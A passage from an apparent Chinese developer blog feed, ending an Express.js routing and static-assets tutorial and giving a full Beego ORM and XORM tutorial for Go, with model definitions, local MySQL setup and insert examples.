body.</td></tr></tbody></table><h3 id="express.router">express.Router()</h3><p>定义Handler的方式可能有点乱，还有一种模块化的管理路由的方式就是使用<code>express.Router</code>，我们单独在一个文件中写路由规则，然后导出这个模块使用即可。一个例子如下：</p><p>首先我们使用express初始化后的工程，在<code>routers/index.js</code>文件中写我们的规则：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>然后 <code>views</code>下写我们的视图层文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello Express<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;stylesheets/style.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello Express<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>默认express应用的监听端口是3000，这里使用<code>npm start app.js</code>来启动我们的应用，其本质就是调用了bin目录下的www脚本，其实还是node调用，只不过定义了端口等信息。然后访问网页就可以看到内容了(304是因为我访问过了)：</p><figure><imgsrc="/img/express学习（一）-基于NodeJS的Web框架/image-20210714171804025.png"alt="image-20210714171804025" /><figcaption aria-hidden="true">image-20210714171804025</figcaption></figure><h2 id="静态资源注册">静态资源注册</h2><p>比如图片这些东西直接使用express自带的static函数就可以注册了，例子如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;public&#x27;</span>))</span><br></pre></td></tr></table></figure><p>上面的代码就把public目录下的所有静态资源都开放给外界使用，比如<code>http://localhost:3000/css/style.css</code>就可以被访问到。如果你还有其他目录的资源想要开放，那么也是使用上面的函数进行注册就可以了。</p><p>此外，你也可以将资源挂在到一个虚拟的路径下面，比如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(<span class="string">&#x27;public&#x27;</span>))</span><br></pre></td></tr></table></figure><p>那么上面那个css文件的访问路径就变成了<code>http://localhost:3000/static/css/style.css</code>。上面这种注册方式是因为你的注册语句是写在app.js里面的，如果说你写到其他文件里，express是找不到这个public文件夹的，所以建议这样注册，其中<code>__dirname</code>就是你的项目根目录。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)))</span><br></pre></td></tr></table></figure><h2 id="参考学习">参考学习</h2><p><a href="https://www.expressjs.com.cn/">Express - 基于 Node.js 平台的web 应用开发框架 - Express 中文文档 | Express 中文网(expressjs.com.cn)</a></p><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;哎前端，自己就没踏踏实实学过前端的玩意儿，嚷嚷着要学vue要学angular，结果都是接触个皮毛，完后屁颠屁颠回去学Java了...，今天项目需要，学学express，一个基于NodeJS的快速开发web应用的框架(&lt;strong&gt;属于Nodejs的后端框架&lt;/strong&gt;)，目的是学会基本使用。vue这些前端框架回头专门记录学学(我也好想会做好看的前端呜呜呜)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/express学习（一）-基于NodeJS的Web框架/express-title.png&quot; alt=&quot;express-title&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="前端" scheme="https://lzwgiter.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
    <category term="NodeJS" scheme="https://lzwgiter.github.io/tags/NodeJS/"/>
    
    <category term="express" scheme="https://lzwgiter.github.io/tags/express/"/>
    
  </entry>
  
  <entry>
    <title>Beego学习-ORM</title>
    <link href="https://lzwgiter.github.io/posts/8a9b0b34.html"/>
    <id>https://lzwgiter.github.io/posts/8a9b0b34.html</id>
    <published>2021-07-10T11:58:06.000Z</published>
    <updated>2023-04-19T13:42:03.944Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这篇继续学习Beego框架，主要学习一下Beego自带的的<strong>ORM</strong>框架，并学习其他的ORM框架如<strong>XORM</strong></p><p><img src="/img/Beego学习-ORM/33c2806b5f91142b652527c3edafc114.jpeg" alt="33c2806b5f91142b652527c3edafc114" style="zoom: 67%;" /></p></blockquote><span id="more"></span><h2 id="beego-orm">Beego ORM</h2><h3 id="demo">Demo</h3><p>这部分直接上代码。ORM其实就是持久化技术，即把对象持久化到数据库中，比如spring的JPA等，Beego自己也有自己的ORM框架。按照常例，我们在model中去定义我们的数据结构就可以了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /models/post.go</span></span><br><span class="line"><span class="keyword">package</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/beego/beego/v2/client/orm&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Post <span class="keyword">struct</span> &#123;</span><br><span class="line">    Id      <span class="type">int</span>      <span class="string">`orm:&quot;pk;auto;column(post_name)&quot;`</span></span><br><span class="line">    Title   <span class="type">string</span>   <span class="string">`orm:&quot;column(title)&quot;`</span></span><br><span class="line">    Student *Student <span class="string">`orm:&quot;rel(fk)&quot;`</span>    <span class="comment">// 定义外键</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    orm.RegisterModel(<span class="built_in">new</span>(Post))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /models/student.go</span></span><br><span class="line"><span class="keyword">package</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/beego/beego/v2/client/orm&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">    Id      <span class="type">int</span>     <span class="string">`orm:&quot;pk;auto;unique;column(student_id)&quot;`</span></span><br><span class="line">    Name    <span class="type">string</span>  <span class="string">`orm:&quot;column(name);size(20)&quot;`</span></span><br><span class="line">    ClassId *Class  <span class="string">`orm:&quot;rel(fk);column(class_id)&quot;`</span>    <span class="comment">// 定义外键，教室的ID</span></span><br><span class="line">    Post    []*Post <span class="string">`orm:&quot;reverse(many)&quot;`</span>    <span class="comment">// 定义一对多关系，即一个学生可能有多个论文</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 在init中注册定义好的model</span></span><br><span class="line">    orm.RegisterModel(<span class="built_in">new</span>(Student))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Student)</span></span> AddPost(p ...*Post) &#123;</span><br><span class="line">    s.Post = <span class="built_in">append</span>(s.Post, p...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /models/class.go</span></span><br><span class="line"><span class="keyword">package</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;github.com/beego/beego/v2/client/orm&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Class <span class="keyword">struct</span> &#123;</span><br><span class="line">    Id       <span class="type">int</span>        <span class="string">`orm:&quot;pk;unique;auto;column(class_id)&quot;`</span></span><br><span class="line">    students []*Student <span class="string">`orm:&quot;reverse(many)&quot;`</span>    <span class="comment">// 定义一对多关系，即一个班级有多个学生</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Class)</span></span> Join(s ...*Student) &#123;</span><br><span class="line">    c.students = <span class="built_in">append</span>(c.students, s...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    orm.RegisterModel(<span class="built_in">new</span>(Class))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们去写main函数，在main函数中注册数据库驱动并插入数据。首先我们去新建一个数据库<code>beego_orm</code>以及用户<code>beego</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create database beego_orm;</span><br><span class="line">create user beego@localhost identified by &#x27;beegogood&#x27;;</span><br><span class="line">grant all on beego_orm.* to beego@localhost;</span><br></pre></td></tr></table></figure><p>然后我们链接数据库、新建两条记录分别插入两个表中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;ORMDemo/models&quot;</span></span><br><span class="line">    _ <span class="string">&quot;ORMDemo/routers&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/beego/beego/v2/client/orm&quot;</span></span><br><span class="line">    beego <span class="string">&quot;github.com/beego/beego/v2/server/web&quot;</span></span><br><span class="line">    _ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    err1 := orm.RegisterDriver(<span class="string">&quot;mysql&quot;</span>, orm.DRMySQL)</span><br><span class="line">    <span class="keyword">if</span> err1 != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;Error: %v&quot;</span>, err1)</span><br><span class="line">    &#125;</span><br><span class="line">    err2 := orm.RegisterDataBase(<span class="string">&quot;default&quot;</span>, <span class="string">&quot;mysql&quot;</span>,</span><br><span class="line">        <span class="string">&quot;beego:beegogood@/beego_orm?charset=utf8&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err2 != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;Error: %v&quot;</span>, err2)</span><br><span class="line">    &#125;</span><br><span class="line">    orm.RunSyncdb(<span class="string">&quot;default&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 默认使用default数据库，也可以指定为其他的数据库</span></span><br><span class="line">    o := orm.NewOrm()</span><br><span class="line"></span><br><span class="line">    student1 := <span class="built_in">new</span>(models.Student)</span><br><span class="line">    student2 := <span class="built_in">new</span>(models.Student)</span><br><span class="line">    class := <span class="built_in">new</span>(models.Class)</span><br><span class="line">    post1 := <span class="built_in">new</span>(models.Post)</span><br><span class="line">    post2 := <span class="built_in">new</span>(models.Post)</span><br><span class="line"></span><br><span class="line">    student1.Id = <span class="number">1</span></span><br><span class="line">    student1.Name = <span class="string">&quot;Alice&quot;</span></span><br><span class="line">    student2.Id = <span class="number">2</span></span><br><span class="line">    student2.Name = <span class="string">&quot;Bob&quot;</span></span><br><span class="line"></span><br><span class="line">    post1.Title = <span class="string">&quot;Hello World&quot;</span></span><br><span class="line">    post2.Title = <span class="string">&quot;Beego orm&quot;</span></span><br><span class="line">    post1.Student = student1</span><br><span class="line">    post2.Student = student1</span><br><span class="line">    student1.AddPost(post1, post2)</span><br><span class="line"></span><br><span class="line">    class.Id = <span class="number">1</span></span><br><span class="line">    student1.ClassId = class</span><br><span class="line">    student2.ClassId = class</span><br><span class="line">    class.Join(student1, student2)</span><br><span class="line"></span><br><span class="line">    o.Insert(student1)</span><br><span class="line">    o.Insert(student2)</span><br><span class="line">    o.Insert(post1)</span><br><span class="line">    o.Insert(post2)</span><br><span class="line">    o.Insert(class)</span><br><span class="line"></span><br><span class="line">    beego.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动后我们看一下数据库的内容：</p><figure><img src="/img/Beego学习-ORM/image-20210710194121221.png"alt="image-20210710194121221" /><figcaption aria-hidden="true">image-20210710194121221</figcaption></figure><figure><img src="/img/Beego学习-ORM/image-20210710190431432.png"alt="image-20210710190431432" /><figcaption aria-hidden="true">image-20210710190431432</figcaption></figure><p>我们的数据也插进去了：</p><figure><img src="/img/Beego学习-ORM/image-20210710194236049.png"alt="image-20210710194236049" /><figcaption aria-hidden="true">image-20210710194236049</figcaption></figure><figure><img src="/img/Beego学习-ORM/image-20210710194242879.png"alt="image-20210710194242879" /><figcaption aria-hidden="true">image-20210710194242879</figcaption></figure><figure><img src="/img/Beego学习-ORM/image-20210710194249760.png"alt="image-20210710194249760" /><figcaption aria-hidden="true">image-20210710194249760</figcaption></figure><p>这里注意下，官方的教程里是有问题的，在注册了数据库驱动和数据库后，还要进行一个同步的操作：<code>orm.RunSyncdb("default", false, true)</code>，否则你可能会提示表不存在什么的。控制台我们也可以看到后台的建表语句：</p><figure><img src="/img/Beego学习-ORM/image-20210710190453057.png"alt="image-20210710190453057" /><figcaption aria-hidden="true">image-20210710190453057</figcaption></figure><p>beego默认是使用结构体中的<code>Id</code>字段来作为主键的。</p><h3 id="重要字段">重要字段</h3><p>从上面的Demo中可以看出，BeegoORM在处理字段映射关系的时候，使用的是两个反引号包括的形式，里面使用键值的方式来进行设置，每个属性使用<code>;</code>来进行分隔如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`orm:&quot;pk;auto;column(student_id)&quot;`</span></span><br></pre></td></tr></table></figure><p>这就好比JPA里的一些字段注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Id</span></span><br><span class="line"><span class="keyword">private</span> String Id;</span><br><span class="line"><span class="meta">@Column</span></span><br><span class="line"><span class="keyword">private</span> String name;</span><br></pre></td></tr></table></figure><p>通过上述的方式就可以实现对字段进行一些设置，如<code>pk</code>代表<code>Primary Key</code>，<code>auto</code>代表自增长等等，也是比较方便的。</p><p>具体每一个字段的含义，请查看<ahref="https://beego.me/docs/mvc/model/models.md">官方文档</a></p><h2 id="xorm">XORM</h2><h3 id="基本概念">基本概念</h3><blockquote><p>官方中文指导文档：<ahref="https://gobook.io/read/gitea.com/xorm/manual-zh-CN/">首页 |(gobook.io)</a></p></blockquote><p>xorm的使用方法其实与beegoorm大同小异，只不过在列<code>Column</code>--也就是结构体的字段定义上有一点区别，使用<code>xorm:xxx xxx xx</code>来进行定义（注意是空格而不是分号）。官方给出的所有可用的选项如下所示：</p><table><colgroup><col style="width: 30%" /><col style="width: 69%" /></colgroup><tbody><tr class="odd"><td><strong>字段</strong></td><td><strong>作用</strong></td></tr><tr class="even"><td>name</td><td>当前field对应的字段的名称，可选，如不写，则自动根据field名字和转换规则命名，如与其它关键字冲突，请使用单引号括起来。</td></tr><tr class="odd"><td>pk</td><td>是否是PrimaryKey，如果在一个struct中有多个字段都使用了此标记，则这多个字段构成了复合主键，单主键当前支持int32,int,int64,uint32,uint,uint64,string这7种Go的数据类型，复合主键支持这7种Go的数据类型的组合。</td></tr><tr class="even"><td>autoincr</td><td>是否是自增</td></tr><tr class="odd"><td>[not ]null 或 notnull</td><td>是否可以为空</td></tr><tr class="even"><td>unique或unique(uniquename)</td><td>是否是唯一，如不加括号则该字段不允许重复；如加上括号，则括号中为联合唯一索引的名字，此时如果有另外一个或多个字段和本unique的uniquename相同，则这些uniquename相同的字段组成联合唯一索引</td></tr><tr class="odd"><td>index或index(indexname)</td><td>是否是索引，如不加括号则该字段自身为索引，如加上括号，则括号中为联合索引的名字，此时如果有另外一个或多个字段和本index的indexname相同，则这些indexname相同的字段组成联合索引</td></tr><tr class="even"><td>extends</td><td>应用于一个匿名成员结构体或者非匿名成员结构体之上，表示此结构体的所有成员也映射到数据库中，extends可加载无限级</td></tr><tr class="odd"><td>-</td><td>这个Field将不进行字段映射</td></tr><tr class="even"><td>-&gt;</td><td>这个Field将只写入到数据库而不从数据库读取</td></tr><tr class="odd"><td>&lt;-</td><td>这个Field将只从数据库读取，而不写入到数据库</td></tr><tr class="even"><td>created</td><td>这个Field将在Insert时自动赋值为当前时间</td></tr><tr class="odd"><td>updated</td><td>这个Field将在Insert或Update时自动赋值为当前时间</td></tr><tr class="even"><td>deleted</td><td>这个Field将在Delete时设置为当前时间，并且当前记录不删除</td></tr><tr class="odd"><td>version</td><td>这个Field将会在insert时默认为1，每次更新自动加1</td></tr><tr class="even"><td>default 0或default(0)</td><td>设置默认值，紧跟的内容如果是Varchar等需要加上单引号</td></tr><tr class="odd"><td>json</td><td>表示内容将先转成Json格式，然后存储到数据库中，数据库中的字段类型可以为Text或者二进制</td></tr><tr class="even"><td>comment</td><td>设置字段的注释（当前仅支持mysql）</td></tr></tbody></table><p>此外，xorm还有几个自动映射的规则：</p><ul><li><strong>如果field名称为<code>Id</code>而且类型为<code>int64</code>并且没有定义tag，则会被xorm视为主键，并且拥有自增属性。</strong>如果想用<code>Id</code>以外的名字或非int64类型做为主键名，必须在对应的Tag上加上<code>xorm:"pk"</code>来定义主键，加上<code>xorm:"autoincr"</code>作为自增。这里需要注意的是，有些数据库并不允许非主键的自增属性。</li><li><strong>string类型默认映射为<code>varchar(255)</code></strong>，如果需要不同的定义，可以在tag中自定义，如：<code>varchar(1024)</code></li><li><strong>支持<code>type MyString string</code>等自定义的field，支持Slice,Map等field成员，这些成员默认存储为Text类型，</strong>并且默认将使用Json格式来序列化和反序列化。也支持数据库字段类型为Blob类型。如果是Blob类型，则先使用Json格式序列化再转成[]byte格式。如果是[]byte或者[]uint8，则不做转换二十直接以二进制方式存储。</li><li><strong>实现了Conversion接口的类型或者结构体，将根据接口的转换方式在类型和数据库记录之间进行相互转换，这个接口的优先级是最高的。</strong>接口定义如下：</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Conversion <span class="keyword">interface</span> &#123;</span><br><span class="line">    FromDB([]<span class="type">byte</span>) <span class="type">error</span></span><br><span class="line">    ToDB() ([]<span class="type">byte</span>, <span class="type">error</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果一个结构体包含一个 Conversion的接口类型，那么在获取数据时，必须要预先设置一个实现此接口的struct或者struct的指针。此时可以在此struct中实现<code>BeforeSet(name string, cell xorm.Cell)</code>方法来进行预先给Conversion赋值。</li></ul><p>另外，结构体自动转换为对应的数据库类型时，下表显示了转换关系：</p><table><colgroup><col style="width: 52%" /><col style="width: 35%" /><col style="width: 13%" /></colgroup><tbody><tr class="odd"><td><strong>go type's kind</strong></td><td><strong>value method</strong></td><td><strong>xorm type</strong></td></tr><tr class="even"><td>implemented Conversion</td><td>Conversion.ToDB / Conversion.FromDB</td><td>Text</td></tr><tr class="odd"><td>int, int8, int16, int32, uint, uint8, uint16, uint32</td><td></td><td>Int</td></tr><tr class="even"><td>int64, uint64</td><td></td><td>BigInt</td></tr><tr class="odd"><td>float32</td><td></td><td>Float</td></tr><tr class="even"><td>float64</td><td></td><td>Double</td></tr><tr class="odd"><td>complex64, complex128</td><td>json.Marshal / json.UnMarshal</td><td>Varchar(64)</td></tr><tr class="even"><td>[]uint8</td><td></td><td>Blob</td></tr><tr class="odd"><td>array, slice, map except []uint8</td><td>json.Marshal / json.UnMarshal</td><td>Text</td></tr><tr class="even"><td>bool</td><td>1 or 0</td><td>Bool</td></tr><tr class="odd"><td>string</td><td></td><td>Varchar(255)</td></tr><tr class="even"><td>time.Time</td><td></td><td>DateTime</td></tr><tr class="odd"><td>cascade struct</td><td>primary key field value</td><td>BigInt</td></tr><tr class="even"><td>struct</td><td>json.Marshal / json.UnMarshal</td><td>Text</td></tr><tr class="odd"><td>Others</td><td></td><td>Text</td></tr></tbody></table><h3 id="demo-1">Demo</h3><p>直接上代码。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Book <span class="keyword">struct</span> &#123;</span><br><span class="line">    Id     <span class="type">int</span>    <span class="string">`xorm:&quot;pk autoincr&quot;`</span></span><br><span class="line">    Title  <span class="type">string</span> <span class="string">`xorm:&quot;varchar(30)&quot;`</span></span><br><span class="line">    Author <span class="type">string</span> <span class="string">`xorm:&quot;varchar(30)&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;XormDemo/models&quot;</span></span><br><span class="line">    _ <span class="string">&quot;XormDemo/routers&quot;</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    beego <span class="string">&quot;github.com/beego/beego/v2/server/web&quot;</span></span><br><span class="line">    _ <span class="string">&quot;github.com/go-sql-driver/mysql&quot;</span></span><br><span class="line">    <span class="string">&quot;xorm.io/xorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> engine *xorm.Engine</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">    <span class="comment">// 一般情况下只需要一个数据库使用一个engine来进行操作，并且是线程安全的</span></span><br><span class="line">    <span class="comment">// 并且无需显示关闭引擎，当程序退出时会自动关闭</span></span><br><span class="line">    engine, err = xorm.NewEngine(<span class="string">&quot;mysql&quot;</span>, <span class="string">&quot;beego:beegogood@/xorm_demo?charset=utf8&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;database setup failed %v&quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注册模型</span></span><br><span class="line">    err = engine.Sync(<span class="built_in">new</span>(models.Book))</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新建几个对象</span></span><br><span class="line">    book := <span class="built_in">new</span>(models.Book)</span><br><span class="line">    book.Title = <span class="string">&quot;Beego&quot;</span></span><br><span class="line">    book.Author = <span class="string">&quot;astaxie&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入记录</span></span><br><span class="line">    affected, _ := engine.Insert(book)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;result: %v&quot;</span>, affected)</span><br><span class="line">    beego.Run()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><figure><img src="/img/Beego学习-ORM/image-20210711175558003.png"alt="image-20210711175558003" /><figcaption aria-hidden="true">image-20210711175558003</figcaption></figure><p><strong>这里有一个疑问，xorm怎么定义外键呢？比方说beegoorm里的reverse和rel关键字这个问题我还没有找到解答，暂时留一个问题在这里，如果解决了我会将上面的代码修改为多个表的例子</strong></p><h2 id="参考学习">参考学习</h2><p><ahref="https://gitea.com/xorm/xorm/src/branch/master/README_CN.md">xorm/xorm:Simple and Powerful ORM for Go, supportmysql,postgres,tidb,sqlite3,sqlite,mssql,oracle,cockroach - README_CN.mdat master - xorm - Gitea: Git with a cup of 